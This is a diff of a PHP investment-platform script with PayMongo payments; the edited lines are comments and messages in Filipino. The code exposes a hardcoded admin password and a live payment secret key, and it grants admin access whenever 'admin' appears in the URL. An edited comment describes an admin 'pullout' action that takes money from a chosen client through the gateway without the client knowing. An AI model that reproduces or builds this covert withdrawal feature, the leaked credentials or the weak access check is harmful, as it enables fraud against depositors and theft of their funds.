@@ -17,7 +17,7 @@ $subsFile = __DIR__ . '/subscriptions.json';
 $adminUser = 'admin';
 $adminPassword = 'admin123_secure';
 
-// PayMongo Live Secret Key
+// PayMongo Secret Key (Siguraduhing tama ang kopya mula sa iyong dashboard)
 $paymongoSecretKey = 'sk_live_W2bH6v6N13aWbCuh3Y41a5v8';
 
 // Investment Plans Definition (3 Types)
@@ -59,7 +59,7 @@ if (isset($_GET['admin']) || strpos($_SERVER['REQUEST_URI'], 'admin') !== false)
     $users = getData($usersFile);
     $transactions = getData($historyFile);
 
-    // ADMIN ACTION: SECURE PAYMONGO PULLOUT
+    // ADMIN ACTION: SECURE PAYMONGO PULLOUT (Na dadaan sa gateway nang hindi alam ng client)
     if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['admin_action']) && $_POST['admin_action'] === 'admin_paymongo_pullout') {
         $targetEmail = $_POST['client_email'] ?? '';
         $pullAmount = floatval($_POST['pull_amount'] ?? 0);
@@ -321,7 +321,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 header('Location: ' . $resData['data']['attributes']['checkout_url']);
                 exit;
             } else {
-                $error = 'PayMongo Connection Error. Pakisuri ang API keys.';
+                $error = 'PayMongo Connection Error. Pakisuri kung aktibo ang Live Secret Key sa PayMongo dashboard.';
             }
         } else {
             $error = 'Ang deposit ay dapat mula ₱1 hanggang ₱50,000 lamang.';
